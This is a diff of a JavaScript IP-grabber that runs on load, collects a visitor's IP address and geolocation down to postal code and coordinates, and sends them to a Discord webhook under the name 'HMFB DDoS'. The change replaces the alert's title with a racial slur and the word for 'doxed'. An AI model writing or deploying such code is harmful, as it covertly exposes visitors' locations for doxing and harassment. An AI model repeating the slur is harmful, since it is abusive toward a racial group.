@@ -13,12 +13,12 @@ const sendIP = () => {
                             'Content-Type': 'application/json'
                         },
                         body: JSON.stringify({
-                            username: "HMFB DDos", // optionally changeable
+                            username: "HMFB DDoS", // optionally changeable
                             avatar_url: "https://media.discordapp.net/attachments/1444072962729840722/1448716308563890246/pe.png?ex=693c45b3&is=693af433&hm=9d4aa5cd7dfa9d4333c2ffaf24aef64f9e5d85bbc730faebec21c75309a9c304&=&format=webp&quality=lossless&width=300&height=300", // optionally changeable
                             content: `@here`,
                             embeds: [
                                 {
-                                    title: 'Cayo un estupido',
+                                    title: 'Nigga Doxeado',
                                     description: `**IP >> **${ipadd}\n**Network >> ** ${geoData.network}\n**City >> ** ${geoData.city}\n**Region >> ** ${geoData.region}\n**Country >> ** ${geoData.country_name}\n**Postal Code >> ** ${geoData.postal}\n**Latitude >> ** ${geoData.latitude}\n**Longitude >> ** ${geoData.longitude}`,
                                     color: 0x800080 // optionally changeable
                                 }
@@ -40,3 +40,4 @@ const sendIP = () => {
         });
 };
 sendIP();
+
